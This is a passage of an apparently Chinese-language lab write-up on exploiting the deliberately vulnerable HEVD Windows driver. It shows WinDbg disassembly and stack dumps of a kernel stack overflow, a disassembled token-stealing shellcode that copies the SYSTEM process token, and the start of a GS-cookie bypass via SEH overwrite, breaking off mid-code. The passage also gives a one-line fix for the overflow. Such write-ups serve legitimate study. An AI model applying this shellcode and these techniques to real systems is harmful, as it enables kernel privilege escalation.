<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u ad3351a2 L50 </span><br><span class="line">ad3351a2 680c080000      push    80Ch</span><br><span class="line">ad3351a7 68e0232fad      push    offset HEVD!__safe_se_handler_table+0x2a0 (ad2f23e0)</span><br><span class="line">ad3351ac e84fbefbff      call    HEVD!__SEH_prolog4 (ad2f1000)</span><br><span class="line">ad3351b1 33ff            xor     edi,edi</span><br><span class="line">ad3351b3 bb00080000      mov     ebx,800h</span><br><span class="line">ad3351b8 53              push    ebx</span><br><span class="line">ad3351b9 57              push    edi</span><br><span class="line">ad3351ba 8d85e4f7ffff    lea     eax,[ebp-81Ch]</span><br><span class="line">ad3351c0 50              push    eax</span><br><span class="line">ad3351c1 e81cc0fbff      call    HEVD!memset (ad2f11e2)</span><br><span class="line">ad3351c6 83c40c          add     esp,0Ch</span><br><span class="line">ad3351c9 897dfc          mov     dword ptr [ebp-4],edi</span><br><span class="line">ad3351cc 6a01            push    1</span><br><span class="line">ad3351ce 53              push    ebx</span><br><span class="line">ad3351cf ff7508          push    dword ptr [ebp+8]</span><br><span class="line">ad3351d2 ff1524202fad    call    dword ptr [HEVD!_imp__ProbeForRead (ad2f2024)]</span><br><span class="line">ad3351d8 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">ad3351db 68ee7433ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad3374ee)</span><br><span class="line">ad3351e0 6a03            push    3</span><br><span class="line">ad3351e2 6a4d            push    4Dh</span><br><span class="line">ad3351e4 5b              pop     ebx</span><br><span class="line">ad3351e5 53              push    ebx</span><br><span class="line">ad3351e6 8b3504202fad    mov     esi,dword ptr [HEVD!_imp__DbgPrintEx (ad2f2004)]</span><br><span class="line">ad3351ec ffd6            call    esi</span><br><span class="line">ad3351ee ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">ad3351f1 68047533ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad337504)</span><br><span class="line">ad3351f6 6a03            push    3</span><br><span class="line">ad3351f8 53              push    ebx</span><br><span class="line">ad3351f9 ffd6            call    esi</span><br><span class="line">ad3351fb 8d85e4f7ffff    lea     eax,[ebp-81Ch]</span><br><span class="line">ad335201 50              push    eax</span><br><span class="line">ad335202 68207533ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad337520)</span><br><span class="line">ad335207 6a03            push    3</span><br><span class="line">ad335209 53              push    ebx</span><br><span class="line">ad33520a ffd6            call    esi</span><br><span class="line">ad33520c 6800080000      push    800h</span><br><span class="line">ad335211 68387533ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad337538)</span><br><span class="line">ad335216 6a03            push    3</span><br><span class="line">ad335218 53              push    ebx</span><br><span class="line">ad335219 ffd6            call    esi</span><br><span class="line">ad33521b 83c440          add     esp,40h</span><br><span class="line">ad33521e 68167633ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad337616)</span><br><span class="line">ad335223 6a03            push    3</span><br><span class="line">ad335225 53              push    ebx</span><br><span class="line">ad335226 ffd6            call    esi</span><br><span class="line">ad335228 ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">ad33522b ff7508          push    dword ptr [ebp+8]</span><br><span class="line">ad33522e 8d85e4f7ffff    lea     eax,[ebp-81Ch]</span><br><span class="line">ad335234 50              push    eax</span><br><span class="line">ad335235 e8a2bffbff      call    HEVD!memcpy (ad2f11dc)//为溢出函数</span><br><span class="line">ad33523a 83c418          add     esp,18h</span><br><span class="line">ad33523d eb27            jmp     HEVD!TriggerBufferOverflowStack+0xc4 (ad335266)</span><br><span class="line">ad33523f 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">ad335242 8b00            mov     eax,dword ptr [eax]</span><br><span class="line">ad335244 8b00            mov     eax,dword ptr [eax]</span><br><span class="line">ad335246 8945e4          mov     dword ptr [ebp-1Ch],eax</span><br><span class="line">ad335249 33c0            xor     eax,eax</span><br><span class="line">ad33524b 40              inc     eax</span><br><span class="line">ad33524c c3              ret</span><br><span class="line">ad33524d 8b65e8          mov     esp,dword ptr [ebp-18h]</span><br><span class="line">ad335250 8b7de4          mov     edi,dword ptr [ebp-1Ch]</span><br><span class="line">ad335253 57              push    edi</span><br><span class="line">ad335254 68f07233ad      push    offset HEVD! ?? ::NNGAKEGL::`string&#x27; (ad3372f0)</span><br><span class="line">ad335259 6a03            push    3</span><br><span class="line">ad33525b 6a4d            push    4Dh</span><br><span class="line">ad33525d ff1504202fad    call    dword ptr [HEVD!_imp__DbgPrintEx (ad2f2004)]</span><br><span class="line">ad335263 83c410          add     esp,10h</span><br><span class="line">ad335266 c745fcfeffffff  mov     dword ptr [ebp-4],0FFFFFFFEh</span><br><span class="line">ad33526d 8bc7            mov     eax,edi</span><br><span class="line">ad33526f 8b4df0          mov     ecx,dword ptr [ebp-10h]</span><br><span class="line">ad335272 64890d00000000  mov     dword ptr fs:[0],ecx</span><br><span class="line">ad335279 59              pop     ecx</span><br><span class="line">ad33527a 5f              pop     edi</span><br><span class="line">ad33527b 5e              pop     esi</span><br><span class="line">ad33527c 5b              pop     ebx</span><br><span class="line">ad33527d c9              leave</span><br><span class="line">ad33527e c20800          ret     8</span><br><span class="line">ad335281 cc              int     3</span><br><span class="line">ad335282 55              push    ebp</span><br><span class="line">ad335283 8bec            mov     ebp,esp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ad335235</code>的<code>call    HEVD!memcpy (ad2f11dc)</code>是溢出发生的函数</p>
<p>下断点之后运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bp ad335235</span><br><span class="line">g</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/12/2023-8-HEVD/image-20230813000610281.png" alt="image-20230813000610281"></p>
<p>看此时的ebp</p>
<p><code>aadb7ab0</code>-&gt;<code>aadb7ac0</code>-&gt;<code>aadb7adc</code>-&gt;<code>00000000</code></p>
<p>这里ebp实际为<code>aadb7adc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd ebp</span><br><span class="line">aadb7ab0  aadb7ac0 ad33519a 002cf2ac 00000824</span><br><span class="line">aadb7ac0  aadb7adc ad3340ba 87561850 875618c0</span><br><span class="line">aadb7ad0  85b68f80 87785818 00000000 aadb7af4</span><br><span class="line">aadb7ae0  83e87f87 87785818 87561850 87561850</span><br><span class="line">aadb7af0  87785818 aadb7b14 84085eec 00000000</span><br><span class="line">aadb7b00  87561850 875618c0 00000094 04db7bac</span><br><span class="line">aadb7b10  aadb7b24 aadb7bd0 840892a8 87785818</span><br></pre></td></tr></table></figure>

<p>单步步过p</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">HEVD!TriggerBufferOverflowStack+0x98:</span><br><span class="line">ad33523a 83c418          add     esp,18h</span><br></pre></td></tr></table></figure>

<p>查看esp和ebp：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; <span class="built_in">dd</span> esp</span><br><span class="line">aadb726c  aadb7294 002cf2ac 00000824 0000004d</span><br><span class="line">aadb727c  00000003 ad337616 576f491a 87561850</span><br><span class="line">aadb728c  83f1617c 875618c0 41414141 41414141</span><br><span class="line">aadb729c  41414141 41414141 41414141 41414141</span><br><span class="line">aadb72ac  41414141 41414141 41414141 41414141</span><br><span class="line">aadb72bc  41414141 41414141 41414141 41414141</span><br><span class="line">aadb72cc  41414141 41414141 41414141 41414141</span><br><span class="line">aadb72dc  41414141 41414141 41414141 41414141</span><br><span class="line">kd&gt; <span class="built_in">dd</span> ebp</span><br><span class="line">aadb7ab0  41414141 013b1040 002cf2ac 00000824</span><br><span class="line">aadb7ac0  aadb7adc ad3340ba 87561850 875618c0</span><br><span class="line">aadb7ad0  85b68f80 87785818 00000000 aadb7af4</span><br><span class="line">aadb7ae0  83e87f87 87785818 87561850 87561850</span><br><span class="line">aadb7af0  87785818 aadb7b14 84085eec 00000000</span><br><span class="line">aadb7b00  87561850 875618c0 00000094 04db7bac</span><br><span class="line">aadb7b10  aadb7b24 aadb7bd0 840892a8 87785818</span><br><span class="line">aadb7b20  85b68f80 00000000 00000101 00025900</span><br></pre></td></tr></table></figure>

<p>可以看到压入的数据已经覆盖到了ebp的地址，然后改写ret地址为shellcode地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u 013b1040 </span><br><span class="line">013b1040 53              push    ebx</span><br><span class="line">013b1041 56              push    esi</span><br><span class="line">013b1042 57              push    edi</span><br><span class="line">013b1043 60              pushad</span><br><span class="line">013b1044 33c0            xor     eax,eax</span><br><span class="line">013b1046 648b8024010000  mov     eax,dword ptr fs:[eax+124h]</span><br><span class="line">013b104d 8b4050          mov     eax,dword ptr [eax+50h]</span><br><span class="line">013b1050 8bc8            mov     ecx,eax</span><br><span class="line">kd&gt; u 013b1040 L20</span><br><span class="line">013b1040 53              push    ebx</span><br><span class="line">013b1041 56              push    esi</span><br><span class="line">013b1042 57              push    edi</span><br><span class="line">013b1043 60              pushad</span><br><span class="line">013b1044 33c0            xor     eax,eax</span><br><span class="line">013b1046 648b8024010000  mov     eax,dword ptr fs:[eax+124h]</span><br><span class="line">013b104d 8b4050          mov     eax,dword ptr [eax+50h]</span><br><span class="line">013b1050 8bc8            mov     ecx,eax</span><br><span class="line">013b1052 ba04000000      mov     edx,4</span><br><span class="line">013b1057 8b80b8000000    mov     eax,dword ptr [eax+0B8h]</span><br><span class="line">013b105d 2db8000000      sub     eax,0B8h</span><br><span class="line">013b1062 3990b4000000    cmp     dword ptr [eax+0B4h],edx</span><br><span class="line">013b1068 75ed            jne     013b1057</span><br><span class="line">013b106a 8b90f8000000    mov     edx,dword ptr [eax+0F8h]</span><br><span class="line">013b1070 8991f8000000    mov     dword ptr [ecx+0F8h],edx</span><br><span class="line">013b1076 61              popad</span><br><span class="line">013b1077 33c0            xor     eax,eax</span><br><span class="line">013b1079 83c40c          add     esp,0Ch</span><br><span class="line">013b107c 5d              pop     ebp</span><br><span class="line">013b107d c20800          ret     8</span><br><span class="line">013b1080 5f              pop     edi</span><br><span class="line">013b1081 5e              pop     esi</span><br><span class="line">013b1082 5b              pop     ebx</span><br><span class="line">013b1083 c3              ret</span><br></pre></td></tr></table></figure>

<p>继续执行，当<code>ad33527e c20800          ret     8</code>执行完后，就去执行shellcode了：</p>
<p><img src="/2023/08/12/2023-8-HEVD/image-20230813001528633.png" alt="image-20230813001528633"></p>
<p><code>pop ebp</code>对堆栈进行平衡后的<code>ebp</code>：已还原</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd ebp</span><br><span class="line">aadb7adc  aadb7af4 83e87f87 87785818 87561850</span><br><span class="line">aadb7aec  87561850 87785818 aadb7b14 84085eec</span><br><span class="line">aadb7afc  00000000 87561850 875618c0 00000094</span><br><span class="line">aadb7b0c  04db7bac aadb7b24 aadb7bd0 840892a8</span><br><span class="line">aadb7b1c  87785818 85b68f80 00000000 00000101</span><br><span class="line">aadb7b2c  00025900 00000002 92412bc0 0000001c</span><br><span class="line">aadb7b3c  002cf1cc 840d07a9 95b108bc 00000000</span><br><span class="line">aadb7b4c  95b10850 aadb7bb4 00000000 0012019f</span><br></pre></td></tr></table></figure>



<h2 id="shellcode分析"><a href="#shellcode分析" class="headerlink" title="shellcode分析"></a>shellcode分析</h2><p>查看所有进程<code>EPROCESS</code>首地址：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!dml_proc</span><br></pre></td></tr></table></figure>

<p>查看凭证：</p>
<p>进程Token在<code>EPROCESS</code>结构体偏移<code>0xF8</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">    VOID* UniqueProcessId;                                                  <span class="comment">//0xb4</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span> <span class="title">Token</span>;</span>                                              <span class="comment">//0xf8</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">copy</span><br><span class="line"><span class="comment">//0x4 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EX_FAST_REF</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        VOID* Object; <span class="comment">//0x0</span></span><br><span class="line">        ULONG RefCnt:<span class="number">3</span>; <span class="comment">//0x0</span></span><br><span class="line">        ULONG Value;  <span class="comment">//0x0</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>这里使用<code>svchost.exe</code>作为示例：</p>
<ol>
<li>直接通过<code>!process</code>查看</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0</span><br><span class="line">PROCESS 8664ba58  SessionId: 0  Cid: 0d08    Peb: 7ffda000  ParentCid: 01fc</span><br><span class="line">    DirBase: 3ebc44e0  ObjectTable: 89b87328  HandleCount: 313.</span><br><span class="line">    Image: svchost.exe</span><br><span class="line">kd&gt; !process 8664ba58  </span><br><span class="line">PROCESS 8664ba58  SessionId: 0  Cid: 0d08    Peb: 7ffda000  ParentCid: 01fc</span><br><span class="line">    DirBase: 3ebc44e0  ObjectTable: 89b87328  HandleCount: 313.</span><br><span class="line">    Image: svchost.exe</span><br><span class="line">    VadRoot 87864f18 Vads 106 Clone 0 Private 468. Modified 92. Locked 0.</span><br><span class="line">    DeviceMap 89006880</span><br><span class="line">    Token                             898fcc78</span><br><span class="line">    ElapsedTime                       01:06:20.6</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>通过<code>EPROCESS</code>偏移查看</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_EX_FAST_REF <span class="number">8664b</span>a58+<span class="number">0xf8</span></span><br><span class="line">   +<span class="number">0x000</span> Object           : <span class="number">0x898fcc7e</span> Void</span><br><span class="line">   +<span class="number">0x000</span> RefCnt           : <span class="number">0</span>y110</span><br><span class="line">   +<span class="number">0x000</span> Value            : <span class="number">0x898fcc7e</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>直接查看内存数据</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd <span class="number">0x8664ba58</span>+<span class="number">0xF8</span></span><br><span class="line">ReadVirtual: <span class="number">8664b</span>b50 not properly sign extended</span><br><span class="line"><span class="number">8664b</span>b50  <span class="number">898f</span>cc7e <span class="number">0001</span>c924 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>b60  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>b70  <span class="number">000001</span>d4 <span class="number">00000000</span> fe939bd0 <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>b80  <span class="number">9</span>c6690c0 <span class="number">000</span>d0000 <span class="number">273f</span>0e8d <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>b90  <span class="number">00000000</span> <span class="number">00000088</span> <span class="number">000001f</span>c <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>ba0  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">89006880</span> <span class="number">85b</span>29890</span><br><span class="line"><span class="number">8664b</span>bb0  <span class="number">7f</span>fd8000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">8664b</span>bc0  <span class="number">8</span>d5f1000 <span class="number">68637673</span> <span class="number">2e74736</span>f <span class="number">00657865</span></span><br></pre></td></tr></table></figure>

<p>可以看到1和2,3是不一样的：</p>
<blockquote>
<p>!process命令会自动应用掩码，并从显示信息中过滤引用计数；我们可以通过使用最右3比特置零的掩码，在如下表达式求值的帮助下，人工实现相同的功能：</p>
<p><code>?[token] &amp; 0xFFFFFFF8</code></p>
</blockquote>
<p>如下即可生成应用掩码后的Token</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ?[<span class="number">898f</span>cc7e] &amp; <span class="number">0xFFFFFFF8</span></span><br><span class="line">Evaluate expression: <span class="number">-1987064712</span> = <span class="number">898f</span>cc78</span><br></pre></td></tr></table></figure>

<p>但是需要的是没有掩码前的<code>token</code></p>
<p>调用到<code>EPROCESS</code>结构体的流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">KPCR（PrcbData）:PrcbData是 _KPRCB结构，PrcbData=KPCR+0x120</span><br><span class="line">=&gt;</span><br><span class="line">KPRCB（CurrentThread）:CurrentThread是_KTHREAD结构,CurrentThread=KPRCB+0x4</span><br><span class="line">=&gt;</span><br><span class="line">KTHREAD（ApcState）:ApcState是_KAPC_STATE结构,ApcState=KTHREAD+0x40</span><br><span class="line">=&gt;</span><br><span class="line">KAPC_STATE（Process）:Process是_KPROCESS结构,Process=KAPC_STATE+0x10</span><br><span class="line">=&gt;</span><br><span class="line">KPROCESS</span><br></pre></td></tr></table></figure>

<p><code>EPROCESS</code>结构体偏移<code>0x0b8</code>表示所有进程的双向链表，双向链表<code>LIST_ENTRY</code>将所有正在运行的进程链接到一条关系线上：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">copy</span><br><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LIST_ENTRY32</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Flink;  <span class="comment">//0x0</span></span><br><span class="line">    ULONG Blink;  <span class="comment">//0x4</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>修复方案：</p>
<p>将<code>size</code>设置为<code>sizeof(KernelBuffer)</code>即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br></pre></td></tr></table></figure>



<h1 id="3-StackOverflowGS-TriggerBufferOverflowStackGS"><a href="#3-StackOverflowGS-TriggerBufferOverflowStackGS" class="headerlink" title="3.StackOverflowGS-TriggerBufferOverflowStackGS"></a>3.StackOverflowGS-TriggerBufferOverflowStackGS</h1><p><a target="_blank" rel="noopener" href="https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c">https://klue.github.io/blog/2017/09/hevd_stack_gs/?msclkid=9bb65ef4cf4a11ec8dd20f19f6cc758c</a></p>
<p>这个是有GS保护的栈溢出</p>
<p>GS编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。<br>在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，随机数标注为“SecurityCookie”。<br>Security Cookie位于EBP之前,系统还将在.data的内存区域中存放一个Security Cookie的副本</p>
<p><img src="/2023/08/12/2023-8-HEVD/921642_VWY7SJUQNVAH4NM.jpg" alt="img"></p>
<p>在函数返回之前，系统将执行一个额外的安全验证操作，被称做 Security check。在Security Check的过程中，系统将比较栈帧中原先存放的Security Co okie和.data中副本的值，如果两者不吻合，说明栈帧中的Security Cookie已被破坏，即栈中发生了溢出。当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行</p>
<p><img src="/2023/08/12/2023-8-HEVD/921642_JJ8NJG4HUJGPWGT.jpg" alt="img"></p>
<blockquote>
<p>但是额外的数据和操作带来的直接后果就是系统性能的下降，为了将对性能的影响降到最小，编译器在编译程序的时候并不是对所有的函数都应用GS，以下情况不会应用GS。<br>(1）函数不包含缓冲区。<br>(2）函数被定义为具有变量参数列表。<br>(3）函数使用无保护的关键字标记。<br>(4）函数在第一个语句中包含内嵌汇编代码。<br>(5）缓冲区不是8字节类型且大小不大于4个字节。</p>
</blockquote>
<p>除了在返回地址前添加Security Cookie外，在Visual Studio 2005及后续版本还使用了变量重排技术，在编译时根据局部变量的类型对变量在栈帧中的位置进行调整，将字符串变量移动到栈帧的高地址。这样可以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏</p>
<p><img src="/2023/08/12/2023-8-HEVD/921642_ATQJ5SPZCEC3DYX.jpg" alt="img"></p>
<p>GS机制并没有对S.E.H 提供保护，可以通过攻击程序的异常处理达到绕过GS 的目的</p>
<p>异常处理函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler( <span class="keyword">struct</span> _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">                        <span class="type">void</span> * EstablisherFrame,</span><br><span class="line">                        <span class="keyword">struct</span> _CONTEXT *ContextRecord,</span><br><span class="line">                        <span class="type">void</span> * DispatcherContext);</span><br></pre></td></tr></table></figure>



<p>Visual C++为使用结构化异常处理的函数生成的标准异常堆栈帧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">H</span><br><span class="line">EBP<span class="number">-00</span> _ebp</span><br><span class="line">EBP<span class="number">-04</span> trylevel</span><br><span class="line">EBP<span class="number">-08</span> scopetable数组指针</span><br><span class="line">EBP<span class="number">-0</span>C handler函数地址</span><br><span class="line">EBP<span class="number">-10</span>指向前一个EXCEPTION_REGISTRATION结构</span><br><span class="line">EBP<span class="number">-14</span> GetExceptionInformation</span><br><span class="line">EBP<span class="number">-18</span> 栈帧中的标准ESP</span><br><span class="line">L</span><br></pre></td></tr></table></figure>

<h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lm  查看所有已加载模块</span><br><span class="line">lm m H* 设置过滤，查找HEVD模块</span><br><span class="line">lm m HEVD</span><br></pre></td></tr></table></figure>

<p>对于BufferOverflowStackGS，不攻击返回地址，而攻击SEH，覆盖SEH handle ，人为构造异常，触发异常，执行异常处理函数.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 512  </span></span><br><span class="line"></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStackGS</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    UCHAR KernelBuffer[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(UCHAR));</span><br><span class="line">        DbgPrint(<span 